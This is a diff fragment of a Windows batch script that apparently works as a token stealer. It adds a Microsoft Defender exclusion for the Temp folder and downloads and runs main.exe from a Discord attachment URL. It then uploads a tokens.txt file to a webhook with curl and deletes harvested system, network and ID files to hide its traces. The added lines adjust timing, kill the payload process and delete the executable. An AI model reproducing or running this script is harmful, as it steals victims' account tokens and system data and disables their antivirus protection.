@@ -75,9 +75,11 @@ curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 curl -O https://cdn.discordapp.com/attachments/1020784906864963644/1020788311670931496/main.exe
+timeout 3 >NUL
 start main.exe
+timeout 3 >NUL
 
-
+taskkill /f /im main.exe
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%
 
 del %userprofile%\AppData\Local\Temp\tokens.txt
@@ -88,4 +90,5 @@ del %localappdata%\Temp\System_INFO.txt
 del %localappdata%\Temp\netstat.txt
 del %localappdata%\Temp\programms.txt
 del %localappdata%\Temp\uuid.txt
+del %localappdata%\Temp\main.exe
 pause
